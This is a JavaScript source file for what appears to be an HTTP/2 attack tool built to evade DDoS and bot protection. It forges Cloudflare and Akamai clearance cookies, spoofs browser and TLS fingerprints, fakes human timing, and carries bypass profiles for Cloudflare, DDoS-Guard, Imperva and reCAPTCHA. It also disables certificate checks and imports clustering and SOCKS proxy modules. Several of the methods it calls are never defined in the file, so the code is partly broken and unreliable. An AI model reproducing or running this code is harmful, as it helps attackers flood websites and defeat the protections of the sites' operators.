const crypto = require('crypto');
const tls = require('tls');
const net = require('net');
const http2 = require('http2');
const fs = require('fs');
const cluster = require('cluster');
const socks = require('socks').SocksClient;
const HPACK = require('hpack');
const { URL } = require('url');

class AdvancedRedirectHandler {
    constructor({ maxRedirects }) {
        this.maxRedirects = maxRedirects || 15;
    }

    async handleRedirect(headers, currentUrl, options) {
        const location = headers['location'];
        if (!location) return null;
        try {
            const redirectUrl = new URL(location, currentUrl).href;
            return {
                redirectUrl,
                redirectOptions: { customHeaders: options.customHeaders }
            };
        } catch {
            return null;
        }
    }

    getRandomCountryCode() {
        const codes = ['VN', 'US', 'JP', 'SG', 'TH'];
        return codes[Math.floor(Math.random() * codes.length)];
    }
}

class AdvancedHPACKSimulator {
    constructor() {
        this.dynamicTable = [];
        this.maxTableSize = 4096;
        this.currentSize = 0;
        this.indexMap = new Map();
        this.staticTable = this.initStaticTable();
    }

    initStaticTable() {
        return new Map([
            [':authority', 1], [':method GET', 2], [':method POST', 3],
            [':path /', 4], [':scheme https', 7], ['accept', 19],
            ['accept-encoding', 16], ['accept-language', 17],
            ['cache-control', 24], ['cookie', 32], ['user-agent', 58]
        ]);
    }

    addToTable(name, value) {
        const entry = `${name}:${value}`;
        const entrySize = name.length + value.length + 32;
        
        while (this.currentSize + entrySize > this.maxTableSize && this.dynamicTable.length > 0) {
            const removed = this.dynamicTable.shift();
            this.currentSize -= (removed.name.length + removed.value.length + 32);
        }
        
        this.dynamicTable.push({ name, value, entry });
        this.indexMap.set(entry, this.dynamicTable.length + 61);
        this.currentSize += entrySize;
    }

    compressHeaders(headers) {
        const compressed = [];
        const headerOrder = [
            ':method', ':path', ':scheme', ':authority',
            'cache-control', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform',
            'upgrade-insecure-requests', 'user-agent', 'accept',
            'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-user', 'sec-fetch-dest',
            'accept-encoding', 'accept-language', 'cookie', 'referer'
        ];

        const orderedHeaders = {};
        headerOrder.forEach(key => {
            if (headers[key]) orderedHeaders[key] = headers[key];
        });
        Object.keys(headers).forEach(key => {
            if (!orderedHeaders[key]) orderedHeaders[key] = headers[key];
        });

        for (const [name, value] of Object.entries(orderedHeaders)) {
            const entry = `${name}:${value}`;
            if (this.indexMap.has(entry)) {
                compressed.push(`INDEX:${this.indexMap.get(entry)}`);
            } else {
                compressed.push(`LITERAL:${name}:${value}`);
                this.addToTable(name, value);
            }
        }

        return compressed;
    }
}

class BrowserFingerprintGenerator {
    constructor() {
        this.fingerprintCache = new Map();
        this.sessionData = new Map();
        this.initRealFingerprints();
    }

    initRealFingerprints() {
        this.realFingerprints = [
            {
                platform: 'Windows',
                browser: 'Chrome',
                version: '120.0.0.0',
                ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                viewport: '1920x1080',
                webgl: 'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)',
                canvas: this.generateCanvasHash('chrome'),
                audio: this.generateAudioContext('chrome'),
                timezone: 'Asia/Ho_Chi_Minh'
            },
            {
                platform: 'macOS',
                browser: 'Chrome',
                version: '120.0.0.0',
                ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                viewport: '1440x900',
                webgl: 'WebKit WebGL',
                canvas: this.generateCanvasHash('chrome'),
                audio: this.generateAudioContext('chrome'),
                timezone: 'Asia/Bangkok'
            },
            {
                platform: 'Linux',
                browser: 'Firefox',
                version: '121.0',
                ua: 'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
                viewport: '1366x768',
                webgl: 'Mesa DRI Intel(R)',
                canvas: this.generateCanvasHash('firefox'),
                audio: this.generateAudioContext('firefox'),
                timezone: 'Asia/Seoul'
            },
            {
                platform: 'Windows',
                browser: 'Edge',
                version: '120.0.0.0',
                ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
                viewport: '1920x1080',
                webgl: 'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)',
                canvas: this.generateCanvasHash('edge'),
                audio: this.generateAudioContext('edge'),
                timezone: 'Asia/Tokyo'
            },
            {
                platform: 'macOS',
                browser: 'Safari',
                version: '16.0',
                ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',
                viewport: '1440x900',
                webgl: 'WebKit WebGL',
                canvas: this.generateCanvasHash('safari'),
                audio: this.generateAudioContext('safari'),
                timezone: 'Asia/Hong_Kong'
            }
        ];
    }

    generateCanvasHash(browser) {
        const seed = `${browser}_${Date.now()}_${Math.random()}`;
        return crypto.createHash('md5').update(seed).digest('hex');
    }

    generateAudioContext(browser) {
        const base = 124.04344968795776;
        const variation = Math.random() * (browser === 'safari' ? 0.01 : 0.1);
        return (base + variation).toFixed(15);
    }

    getRandomFingerprint() {
        return this.realFingerprints[Math.floor(Math.random() * this.realFingerprints.length)];
    }

    generateAdvancedCookies(hostname, sessionId) {
        const timestamp = Date.now();
        const baseTime = timestamp - Math.floor(Math.random() * 2592000000);
        
        const cookies = {
            cf_clearance: this.generateCfClearance(hostname, sessionId),
            __cf_bm: this.generateCfBm(),
            __cf_bfm: this.randomBase64(64) + '.' + timestamp,
            _cfuvid: `${this.randomHex(32)}.${Math.floor(timestamp/1000)}`,
            ak_bmsc: this.randomBase64(88),
            _abck: `${this.randomBase64(144)}~0~${this.randomBase64(64)}~0~-1`,
            bm_mi: this.generateBmMi(),
            bm_sv: this.generateBmSv(),
            _ga: `GA1.1.${this.generateGAClientId()}.${Math.floor(baseTime/1000)}`,
            [`_ga_${this.randomString(10, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')}`]: `GS1.1.${timestamp}.1.1.${timestamp + Math.floor(Math.random()*3600000)}.0`,
            _gid: `GA1.2.${this.generateGAClientId()}.${Math.floor(timestamp/86400000)}`,
            sessionid: this.randomHex(32),
            csrftoken: this.randomBase64(64),
            _fbp: `fb.1.${timestamp}.${Math.floor(Math.random() * 2000000000)}`,
            _fbc: `fb.1.${timestamp}.${this.randomString(16)}`,
            gdpr_consent: `1~${this.generateConsentString()}`,
            euconsent: this.generateEuConsent()
        };

        return Object.entries(cookies)
            .map(([k, v]) => `${k}=${v}`)
            .join('; ');
    }

    generateCfClearance(hostname, sessionId) {
        const timestamp = Math.floor(Date.now() / 1000);
        const challenge = this.randomBase64(43);
        const hmac = crypto.createHmac('sha256', `${hostname}:${sessionId}`)
            .update(`${challenge}:${timestamp}`)
            .digest('hex').slice(0, 8);
        return `${challenge}.${sessionId}-${timestamp}-${hmac}.bfm${Math.random().toString(36).slice(2, 8)}`;
    }

    generateCfBm() {
        return this.randomBase64(43) + '=';
    }

    generateBmMi() {
        return `${this.randomHex(32)}~${this.randomHex(16)}`;
    }

    generateBmSv() {
        return `${this.randomBase64(1000)}~${this.randomHex(8)}~${Date.now()}`;
    }

    generateGAClientId() {
        return `${Math.floor(Math.random() * 2000000000)}.${Math.floor(Math.random() * 2000000000)}`;
    }

    generateConsentString() {
        const purposes = Array(24).fill().map(() => Math.random() > 0.3 ? '1' : '0').join('');
        return Buffer.from(purposes).toString('base64').replace(/=/g, '');
    }

    generateEuConsent() {
        return `CP${this.randomString(20, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_')}.`;
    }

    randomString(length, chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") {
        return Array.from(crypto.randomBytes(length))
            .map(b => chars[b % chars.length])
            .join('');
    }

    randomBase64(length) {
        return Buffer.from(crypto.randomBytes(Math.ceil(length * 3/4)))
            .toString('base64')
            .replace(/=/g, '')
            .slice(0, length);
    }

    randomHex(length) {
        return crypto.randomBytes(Math.ceil(length/2))
            .toString('hex')
            .slice(0, length);
    }
}

class UltimateHTTP2Bypass {
    constructor(options = {}) {
        this.compressor = new HPACK();
        this.decompressor = new HPACK();
        this.sessionPool = new Map();
        this.fingerprintCache = new Map();
        this.requestCounter = 0;
        this.adaptiveSettings = new Map();
        
        this.bypassLayers = {
            bfm: options.bfm || true,
            ddos: options.ddos || true,
            cache: options.cache || true,
            redirect: options.redirect || true,
            fingerprint: options.fingerprint || true,
            behavioral: options.behavioral || true,
            neural: options.neural || true,
            stealth: options.stealth || false,
            jarm: options.jarm || false
        };

        this.providerProfiles = this.initProviderProfiles();
        this.dynamicFingerprints = this.initDynamicFingerprints();
        this.neuralPatterns = this.initNeuralPatterns();
    }

    initProviderProfiles() {
        return {
            'Cloudflare': {
                base: {
                    priority: 1,
                    headerTableSize: 65536,
                    maxConcurrentStreams: () => Math.random() > 0.3 ? 1000 : 10000,
                    initialWindowSize: 6291456,
                    maxFrameSize: () => Math.random() > 0.15 ? 40000 : 131072,
                    maxHeaderListSize: () => Math.random() > 0.4 ? 262144 : 524288,
                    enablePush: false
                },
                bypass: {
                    bfmBypass: true,
                    jarmBypass: true,
                    ja3Bypass: true,
                    tlsFingerprint: 'chrome_120',
                    http2Fingerprint: 'chrome_advanced',
                    behaviorMimic: 'human_browsing',
                    antiDetection: 'aggressive'
                },
                mutations: {
                    settingsRotation: 5,
                    headerOrder: 'randomized',
                    timingJitter: 'advanced',
                    packetFragmentation: true
                }
            },
            'Akamai': {
                base: {
                    priority: 1,
                    headerTableSize: 65536,
                    maxConcurrentStreams: () => Math.random() > 0.6 ? 1000 : 2000,
                    initialWindowSize: 6291456,
                    maxFrameSize: 16384,
                    maxHeaderListSize: 32768,
                    enablePush: false
                },
                bypass: {
                    bfmBypass: true,
                    edgeBypass: true,
                    cacheBypass: true,
                    behaviorMimic: 'organic_traffic'
                }
            },
            'Amazon': {
                base: {
                    priority: 0,
                    maxConcurrentStreams: () => Math.random() > 0.4 ? 100 : 200,
                    initialWindowSize: 65535,
                    maxHeaderListSize: 262144,
                    headerTableSize: 4096
                },
                bypass: {
                    awsBypass: true,
                    lambdaBypass: true,
                    behaviorMimic: 'api_client'
                }
            },
            'DDoS-Guard': {
                base: {
                    priority: 1,
                    maxConcurrentStreams: () => Math.random() > 0.8 ? 1 : Math.floor(Math.random() * 20) + 1,
                    initialWindowSize: 65535,
                    maxFrameSize: 16777215,
                    maxHeaderListSize: 262144,
                    headerTableSize: 4096
                },
                bypass: {
                    ddosProtectionBypass: true,
                    challengeBypass: true,
                    antiDetection: 'stealth'
                }
            },
            'Google': {
                base: {
                    priority: 0,
                    headerTableSize: 4096,
                    initialWindowSize: 1048576,
                    maxFrameSize: 16384,
                    maxConcurrentStreams: () => Math.random() > 0.3 ? 100 : 150,
                    maxHeaderListSize: 137216
                },
                bypass: {
                    googleBypass: true,
                    recaptchaBypass: true,
                    behaviorMimic: 'search_bot'
                }
            },
            'Fastly': {
                base: {
                    priority: 0,
                    headerTableSize: 4096,
                    initialWindowSize: 65535,
                    maxFrameSize: 16384,
                    maxConcurrentStreams: 100,
                    maxHeaderListSize: 4294967295
                },
                bypass: {
                    cacheBypass: true,
                    behaviorMimic: 'streaming_client'
                }
            },
            'Sucuri': {
                base: {
                    priority: 1,
                    headerTableSize: 65536,
                    maxConcurrentStreams: 1000,
                    initialWindowSize: 6291456,
                    maxFrameSize: 40000,
                    maxHeaderListSize: 262144
                },
                bypass: {
                    firewallBypass: true,
                    antiDetection: 'stealth'
                }
            },
            'Imperva': {
                base: {
                    priority: 1,
                    headerTableSize: 65536,
                    maxConcurrentStreams: 500,
                    initialWindowSize: 6291456,
                    maxFrameSize: 16384,
                    maxHeaderListSize: 32768
                },
                bypass: {
                    incapsulaBypass: true,
                    behaviorMimic: 'human_browsing'
                }
            }
        };
    }

    initDynamicFingerprints() {
        return {
            browsers: [
                {
                    name: 'Chrome',
                    versions: ['120.0.0.0', '119.0.0.0', '118.0.0.0'],
                    platforms: ['Windows NT 10.0; Win64; x64', 'Macintosh; Intel Mac OS X 10_15_7'],
                    features: {
                        webgl: ['ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)', 'ANGLE (Apple, ANGLE Metal Renderer: Apple M1, Version 14.2)'],
                        canvas: () => this.generateCanvasFingerprint(),
                        audioContext: () => this.generateAudioFingerprint(),
                        timezone: ['Asia/Ho_Chi_Minh', 'Asia/Bangkok', 'Asia/Singapore'],
                        languages: [['vi-VN', 'vi', 'en-US', 'en'], ['en-US', 'en', 'vi-VN', 'vi']],
                        webrtc: () => this.generateWebRTC()
                    }
                },
                {
                    name: 'Firefox',
                    versions: ['121.0', '120.0', '119.0'],
                    platforms: ['Windows NT 10.0; Win64; x64; rv:121.0', 'X11; Linux x86_64'],
                    features: {
                        webgl: ['Mozilla -- Angle (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11-30.0.101.1404)'],
                        canvas: () => this.generateCanvasFingerprint('firefox'),
                        audioContext: () => this.generateAudioFingerprint('firefox'),
                        timezone: ['Asia/Seoul', 'Asia/Jakarta'],
                        languages: [['en-US', 'en'], ['vi-VN', 'vi']],
                        webrtc: () => this.generateWebRTC('firefox')
                    }
                },
                {
                    name: 'Edge',
                    versions: ['120.0.0.0', '119.0.0.0'],
                    platforms: ['Windows NT 10.0; Win64; x64'],
                    features: {
                        webgl: ['ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)'],
                        canvas: () => this.generateCanvasFingerprint('edge'),
                        audioContext: () => this.generateAudioFingerprint('edge'),
                        timezone: ['Asia/Tokyo', 'Asia/Seoul'],
                        languages: [['en-US', 'en'], ['vi-VN', 'vi']],
                        webrtc: () => this.generateWebRTC('edge')
                    }
                },
                {
                    name: 'Safari',
                    versions: ['16.0', '15.6'],
                    platforms: ['Macintosh; Intel Mac OS X 10_15_7'],
                    features: {
                        webgl: ['WebKit WebGL'],
                        canvas: () => this.generateCanvasFingerprint('safari'),
                        audioContext: () => this.generateAudioFingerprint('safari'),
                        timezone: ['Asia/Hong_Kong', 'Asia/Shanghai'],
                        languages: [['en-US', 'en'], ['zh-CN', 'zh']],
                        webrtc: () => this.generateWebRTC('safari')
                    }
                }
            ]
        };
    }

    initNeuralPatterns() {
        return {
            humanBehavior: {
                readingTime: () => Math.floor(Math.random() * 3000) + 1000,
                scrollPause: () => Math.floor(Math.random() * 500) + 200,
                clickDelay: () => Math.floor(Math.random() * 300) + 100,
                typingSpeed: () => Math.floor(Math.random() * 50) + 80,
                mouseMovement: () => this.generateMousePattern()
            },
            trafficPatterns: {
                burstiness: () => Math.random() < 0.3,
                sessionLength: () => Math.floor(Math.random() * 30) + 5,
                pageDepth: () => Math.floor(Math.random() * 8) + 1,
                returnVisitor: () => Math.random() < 0.4
            },
            neuralAdaptation: {
                responseAdjustment: (status) => status === 429 ? 0.8 : status === 403 ? 0.6 : 1.0,
                entropyInjection: () => Math.random() * 0.2 + 0.9
            }
        };
    }

    async detectProvider(url) {
        try {
            const hostname = new URL(url).hostname;
            const dnsPatterns = {
                'Cloudflare': /\.cloudflare\.|cloudflare|cf-|cdn-cgi/i,
                'Akamai': /\.akamai\.|akamai|akamaihd/i,
                'Amazon': /\.amazonaws\.|amazon|aws/i,
                'Google': /\.google\.|google|gstatic/i,
                'DDoS-Guard': /ddos-guard|ddosguard/i,
                'Fastly': /\.fastly\.|fastly|fastlycdn/i,
                'Sucuri': /\.sucuri\.|sucuri|waf/i,
                'Imperva': /\.imperva\.|imperva|incapsula/i,
                'Incapsula': /\.incapsula\.|incapsula/i,
                'PerimeterX': /perimeterx|px-/i,
                'DataDome': /datadome/i,
                'Distil': /distilnetworks|distil/i,
                'StackPath': /stackpath|cdn\.sp/i,
                'Varnish': /varnish|varnish-cache/i,
                'ArvanCloud': /arvancloud|arvan/i
            };

            for (const [provider, pattern] of Object.entries(dnsPatterns)) {
                if (pattern.test(hostname)) {
                    return provider;
                }
            }
            return 'Unknown';
        } catch {
            return 'Unknown';
        }
    }

    generateAdaptiveSettings(provider, options = {}) {
        const profile = this.providerProfiles[provider] || this.providerProfiles['Cloudflare'] || {};
        const base = profile.base || {};
        
        const settings = {};
        
        for (const [key, value] of Object.entries(base)) {
            if (typeof value === 'function') {
                settings[key] = value();
            } else {
                settings[key] = value;
            }
        }

        if (profile.mutations) {
            this.applyMutations(settings, profile.mutations);
        }

        if (this.bypassLayers.behavioral) {
            this.applyBehavioralAdaptations(settings, provider);
        }

        if (this.bypassLayers.neural) {
            this.applyNeuralPatterns(settings, provider);
        }

        if (this.bypassLayers.stealth) {
            settings.maxConcurrentStreams = Math.min(settings.maxConcurrentStreams || 100, 100);
            settings.timingJitter = this.generateTimingJitter('advanced') * 2;
        }

        if (this.bypassLayers.jarm) {
            settings.jarmFingerprint = this.generateJARMFingerprint();
        }

        return settings;
    }

    applyMutations(settings, mutations) {
        if (mutations.settingsRotation && this.requestCounter % mutations.settingsRotation === 0) {
            settings.headerTableSize = Math.floor((settings.headerTableSize || 65536) * (0.8 + Math.random() * 0.4));
            settings.initialWindowSize = Math.floor((settings.initialWindowSize || 6291456) * (0.9 + Math.random() * 0.2));
        }

        if (mutations.timingJitter) {
            settings.timingJitter = this.generateTimingJitter(mutations.timingJitter);
        }

        if (mutations.packetFragmentation) {
            settings.fragmentationPattern = this.generateFragmentationPattern();
        }
    }

    applyBehavioralAdaptations(settings, provider) {
        const behavior = this.neuralPatterns.humanBehavior;
        
        settings.connectionTiming = {
            establishment: behavior.readingTime(),
            firstRequest: behavior.clickDelay(),
            subsequentRequests: behavior.scrollPause()
        };

        const traffic = this.neuralPatterns.trafficPatterns;
        settings.trafficPattern = {
            burst: traffic.burstiness(),
            sessionDepth: traffic.pageDepth(),
            returnBehavior: traffic.returnVisitor()
        };
    }

    applyNeuralPatterns(settings, provider) {
        const neuralWeights = this.calculateNeuralWeights(provider);
        
        settings.neuralAdaptation = {
            weights: neuralWeights,
            adaptation: this.generateAdaptationVector(),
            entropy: this.generateEntropyVector()
        };
    }

    generateDynamicHeaders(url, options = {}) {
        const browser = this.selectBrowserProfile();
        const fingerprint = this.generateFingerprint(browser);
        
        const headers = {};
        
        const pseudoHeaders = [':method', ':authority', ':scheme', ':path'];
        if (Math.random() > 0.3 || this.bypassLayers.stealth) {
            pseudoHeaders.sort(() => Math.random() - 0.5);
        }

        const urlObj = new URL(url);
        headers[':method'] = options.method || 'GET';
        headers[':authority'] = urlObj.host;
        headers[':scheme'] = urlObj.protocol.slice(0, -1);
        headers[':path'] = options.path || urlObj.pathname + urlObj.search;

        const headerLayers = [
            () => this.generateCoreHeaders(fingerprint, options),
            () => this.generateSecurityHeaders(fingerprint, options),
            () => this.generateBehavioralHeaders(fingerprint, options),
            () => this.generateFingerprintHeaders(fingerprint, options),
            () => this.generateEntropyHeaders(fingerprint, options)
        ];

        for (const layer of headerLayers) {
            Object.assign(headers, layer());
        }

        if (options.provider) {
            this.applyProviderMutations(headers, options.provider);
        }

        if (this.bypassLayers.stealth) {
            headers['x-stealth-token'] = crypto.randomBytes(16).toString('hex');
            headers['x-human-entropy'] = this.generateEntropyVector();
        }

        return headers;
    }

    generateCoreHeaders(fingerprint, options) {
        return {
            'user-agent': fingerprint.userAgent,
            'accept': this.generateDynamicAccept(options),
            'accept-language': fingerprint.languages.join(','),
            'accept-encoding': 'gzip, deflate, br',
            'cache-control': this.generateDynamicCacheControl(),
            'sec-fetch-dest': options.fetchDest || 'document',
            'sec-fetch-mode': options.fetchMode || 'navigate',
            'sec-fetch-site': options.fetchSite || 'none',
            'sec-fetch-user': '?1'
        };
    }

    generateSecurityHeaders(fingerprint, options) {
        const headers = {
            'sec-ch-ua': fingerprint.secChUa,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': `"${fingerprint.platform}"`,
            'upgrade-insecure-requests': '1'
        };

        if (this.bypassLayers.bfm || this.bypassLayers.stealth) {
            headers['sec-ch-ua-bitness'] = '"64"';
            headers['sec-ch-ua-arch'] = '"x86"';
            headers['sec-ch-ua-model'] = '""';
            headers['sec-ch-ua-platform-version'] = this.generatePlatformVersion(fingerprint.platform);
            headers['x-cloudflare-bot-score'] = Math.floor(Math.random() * 80 + 20).toString();
        }

        return headers;
    }

    generateBehavioralHeaders(fingerprint, options) {
        const headers = {};
        
        if (options.referer) {
            headers['referer'] = options.referer;
        }

        headers['cookie'] = this.generateAdvancedCookies(fingerprint, options);

        if (Math.random() > 0.7) {
            headers['dnt'] = '1';
        }

        if (Math.random() > 0.8 && !this.bypassLayers.stealth) {
            headers['x-requested-with'] = 'XMLHttpRequest';
        }

        return headers;
    }

    generateFingerprintHeaders(fingerprint, options) {
        const headers = {};

        if (this.bypassLayers.fingerprint || this.bypassLayers.stealth) {
            headers['sec-ch-viewport-width'] = fingerprint.viewport.width.toString();
            headers['sec-ch-viewport-height'] = fingerprint.viewport.height.toString();
            headers['sec-ch-dpr'] = fingerprint.devicePixelRatio.toString();
            headers['sec-ch-ua-reduced'] = '?0';
            headers['x-webrtc-enabled'] = fingerprint.webrtc.enabled ? 'true' : 'false';
        }

        headers['x-client-fingerprint'] = this.generateClientFingerprint(fingerprint);
        headers['x-entropy-vector'] = this.generateEntropyVector();

        return headers;
    }

    generateEntropyHeaders(fingerprint, options) {
        const headers = {};
        
        headers['x-request-id'] = crypto.randomUUID();
        headers['x-session-token'] = this.generateSessionToken();
        headers['x-timestamp'] = (Date.now() + Math.floor(Math.random() * 1000)).toString();
        headers['x-nonce'] = crypto.randomBytes(16).toString('hex');
        headers['x-mouse-movement'] = this.generateMousePattern();
        headers['x-typing-pattern'] = this.generateTypingPattern();
        headers['x-scroll-behavior'] = this.generateScrollBehavior();

        if (this.bypassLayers.stealth) {
            headers['x-behavioral-entropy'] = crypto.randomBytes(8).toString('base64');
            headers['x-device-signature'] = this.generateDeviceSignature();
        }

        return headers;
    }

    generateAdvancedCookies(fingerprint, options) {
        const cookies = [];
        const timestamp = Date.now();
        const sessionId = crypto.randomUUID();

        cookies.push(`_ga=GA1.2.${Math.floor(Math.random() * 1000000000)}.${Math.floor(timestamp / 1000)}`);
        cookies.push(`_gid=GA1.2.${Math.floor(Math.random() * 1000000000)}.${Math.floor(timestamp / 1000)}`);
        cookies.push(`_fbp=fb.1.${timestamp}.${Math.floor(Math.random() * 1000000000)}`);
        cookies.push(`session_id=${sessionId}`);
        cookies.push(`csrf_token=${crypto.randomBytes(32).toString('hex')}`);
        cookies.push(`user_preferences=${this.encodeUserPreferences(fingerprint)}`);
        cookies.push(`visit_count=${Math.floor(Math.random() * 100) + 1}`);
        cookies.push(`last_activity=${timestamp - Math.floor(Math.random() * 86400000)}`);
        cookies.push(`entropy_${Math.floor(Math.random() * 1000)}=${crypto.randomBytes(8).toString('hex')}`);
        cookies.push(`behavioral_hash=${this.generateBehavioralHash(fingerprint)}`);

        if (options.provider === 'Cloudflare' || this.bypassLayers.bfm) {
            cookies.push(`__cf_bm=${this.generateCFBM()}`);
            cookies.push(`__cf_bfm=${crypto.randomBytes(64).toString('base64').replace(/[+/=]/g, '')}.${timestamp}`);
            cookies.push(`cf_clearance=${this.generateCFClearance()}.bfm${Math.random().toString(36).slice(2, 8)}`);
        }

        return cookies.join('; ');
    }

    async compressHeaders(headers) {
        const headerList = Object.entries(headers).map(([name, value]) => ({
            name: name.toLowerCase(),
            value: String(value)
        }));

        const compressed = this.compressor.encode(headerList);
        
        if (this.bypassLayers.cache) {
            this.optimizeHPACKTable(headerList);
        }

        return compressed;
    }

    optimizeHPACKTable(headerList) {
        const frequentHeaders = this.analyzeHeaderFrequency(headerList);
        this.compressor.setTableSize(this.calculateOptimalTableSize(frequentHeaders));
    }

    async makeRequest(url, options = {}) {
        this.requestCounter++;
        
        const provider = await this.detectProvider(url);
        const settings = this.generateAdaptiveSettings(provider, options);
        const headers = this.generateDynamicHeaders(url, { ...options, provider });
        
        const connectionOptions = {
            ...settings,
            rejectUnauthorized: false,
            secureProtocol: 'TLSv1_2_method'
        };

        return new Promise((resolve, reject) => {
            try {
                const client = http2.connect(new URL(url).origin, connectionOptions);
                
                const behavioralDelay = this.calculateBehavioralDelay(provider, options);
                
                setTimeout(() => {
                    const req = client.request(headers);
                    
                    req.on('response', (responseHeaders) => {
                        let data = '';
                        req.on('data', chunk => data += chunk);
                        req.on('end', () => {
                            client.close();
                            resolve({
                                status: responseHeaders[':status'],
                                headers: responseHeaders,
                                data,
                                provider,
                                settings,
                                compressed: this.compressor.encode(Object.entries(headers).map(([k,v]) => ({name: k, value: v})))
                            });
                        });
                    });

                    req.on('error', reject);
                    
                    if (options.body) {
                        req.write(options.body);
                    }
                    req.end();
                    
                }, behavioralDelay);
            } catch (err) {
                reject(err);
            }
        });
    }

    selectBrowserProfile() {
        const browsers = this.dynamicFingerprints.browsers;
        return browsers[Math.floor(Math.random() * browsers.length)];
    }

    generateFingerprint(browser) {
        const version = browser.versions[Math.floor(Math.random() * browser.versions.length)];
        const platform = browser.platforms[Math.floor(Math.random() * browser.platforms.length)];
        
        return {
            userAgent: `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) ${browser.name === 'Safari' ? 'Version' : browser.name}/${version} ${browser.name === 'Edge' ? 'Edg' : ''}${browser.name !== 'Safari' ? ' Safari/537.36' : ''}`,
            platform: platform.split(';')[0],
            secChUa: this.generateSecChUa(browser.name, version),
            languages: this.generateLanguages(),
            viewport: { width: 1920, height: 1080 },
            devicePixelRatio: Math.random() > 0.5 ? 1 : 2,
            webgl: browser.features.webgl[0],
            canvas: browser.features.canvas(),
            audioContext: browser.features.audioContext(),
            webrtc: browser.features.webrtc()
        };
    }

    generateSecChUa(browserName, version) {
        const majorVersion = version.split('.')[0];
        if (browserName === 'Chrome') {
            return `"Not_A Brand";v="8", "Chromium";v="${majorVersion}", "Google Chrome";v="${majorVersion}"`;
        } else if (browserName === 'Edge') {
            return `"Not_A Brand";v="8", "Chromium";v="${majorVersion}", "Microsoft Edge";v="${majorVersion}"`;
        } else if (browserName === 'Safari') {
            return `"Safari";v="${majorVersion}", "WebKit";v="${majorVersion}"`;
        }
        return `"Not_A Brand";v="99", "${browserName}";v="${majorVersion}"`;
    }

    generateLanguages() {
        const langSets = [
            ['vi-VN', 'vi;q=0.9', 'en-US;q=0.8', 'en;q=0.7'],
            ['en-US', 'en;q=0.9', 'vi-VN;q=0.8', 'vi;q=0.7'],
            ['en-US', 'en;q=0.9', 'zh-CN;q=0.8', 'zh;q=0.7'],
            ['ja-JP', 'ja;q=0.9', 'en-US;q=0.8', 'en;q=0.7']
        ];
        return langSets[Math.floor(Math.random() * langSets.length)];
    }

    generateCanvasFingerprint(browser = 'chrome') {
        const seed = `${browser}_${Date.now()}_${Math.random()}`;
        return crypto.createHash('md5').update(seed).digest('hex');
    }

    generateAudioFingerprint(browser = 'chrome') {
        return crypto.createHash('md5').update(`audio_${browser}_${Math.random()}`).digest('hex');
    }

    generateWebRTC(browser = 'chrome') {
        return {
            enabled: browser !== 'firefox' || Math.random() > 0.3,
            localIp: `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`,
            publicIp: this.generateRandomIP()
        };
    }

    generateMousePattern() {
        return Array.from({length: 10}, () => 
            `${Math.floor(Math.random() * 1920)},${Math.floor(Math.random() * 1080)}`
        ).join(';');
    }

    generateDynamicAccept(options) {
        const accepts = [
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'application/json, text/plain, */*'
        ];
        return options.accept || accepts[Math.floor(Math.random() * accepts.length)];
    }

    generateDynamicCacheControl() {
        const controls = [
            'no-cache',
            'max-age=0',
            'no-cache, no-store, must-revalidate',
            'max-age=0, no-cache'
        ];
        return controls[Math.floor(Math.random() * controls.length)];
    }

    calculateBehavioralDelay(provider, options) {
        let baseDelay = Math.floor(Math.random() * 1000) + 500;
        
        if (provider === 'Cloudflare') baseDelay += 1000;
        if (provider === 'DDoS-Guard') baseDelay += 2000;
        if (this.requestCounter > 10) baseDelay += this.requestCounter * 50;
        
        if (this.bypassLayers.stealth) {
            baseDelay += this.neuralPatterns.humanBehavior.readingTime();
        }
        
        return Math.min(baseDelay, 10000);
    }

    generateSessionToken() { return crypto.randomBytes(32).toString('hex'); }
    generateClientFingerprint(fp) { return crypto.createHash('sha256').update(JSON.stringify(fp)).digest('hex').substring(0, 16); }
    generateEntropyVector() { return Array.from({length: 8}, () => Math.floor(Math.random() * 256)).join(','); }
    generateBehavioralHash(fp) { return crypto.createHash('md5').update(`${fp.userAgent}_${Date.now()}`).digest('hex'); }
    generateCFBM() { return crypto.randomBytes(43).toString('base64').replace(/[+/=]/g, ''); }
    generateCFClearance() { return crypto.randomBytes(160).toString('hex'); }
    encodeUserPreferences(fp) { return Buffer.from(JSON.stringify({theme: 'dark', lang: 'vi'})).toString('base64'); }
    generateTimingJitter(level) { return level === 'advanced' ? Math.random() * 1000 : Math.random() * 100; }
    generateFragmentationPattern() { return Array.from({length: 5}, () => Math.floor(Math.random() * 1460) + 100); }
    calculateNeuralWeights(provider) { return Array.from({length: 10}, () => Math.random()); }
    generateAdaptationVector() { return Array.from({length: 5}, () => Math.random() * 2 - 1); }
